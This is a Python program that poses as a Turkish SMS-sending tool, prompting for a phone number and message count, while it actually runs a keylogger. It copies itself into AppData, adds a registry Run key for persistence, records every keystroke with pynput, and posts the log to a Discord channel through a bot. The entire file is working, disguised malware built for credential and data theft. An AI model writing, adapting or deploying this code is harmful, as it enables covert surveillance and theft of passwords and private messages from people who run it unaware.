import pynput.keyboard
import discord
from discord.ext import commands
import threading
import subprocess
import os
import shutil
import sys

def addToRegistry():
    newFile = os.path.join(os.environ["appdata"], "main.exe")

    if not os.path.exists(newFile):
        shutil.copyfile(sys.executable, newFile)
        regeditCommand = f'reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "{newFile}"'
        subprocess.call(regeditCommand, shell=True)

addToRegistry()

intents = discord.Intents.default()
intents.typing = True
intents.presences = False
intents.messages = True

token = "" # Enter your discord token
channelID = 1144662908358365369 # Enter your discord channel ID

bot = commands.Bot(command_prefix="!", intents=intents)

log = ""
keyloggerListener = None

def run_keylogger():
    global keyloggerListener
    keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunction)
    keyloggerListener.start()

def callbackFunction(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

def stop_keylogger():
    global keyloggerListener
    if keyloggerListener:
        keyloggerListener.stop()
        keyloggerListener.join()

@bot.event
async def on_ready():
    print(f"Bot logged in as {bot.user.name}")
    threading.Thread(target=run_keylogger).start()

telNo = input("Telefon Numarası: +90")
sms = input("SMS Adeti:" )

print(f"{telNo} Numarasına {sms} Adet SMS Gönderiliyor")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.id == channelID:
        if log:
            await message.channel.send(log)

@bot.event
async def on_disconnect():
    stop_keylogger()

bot.run(token)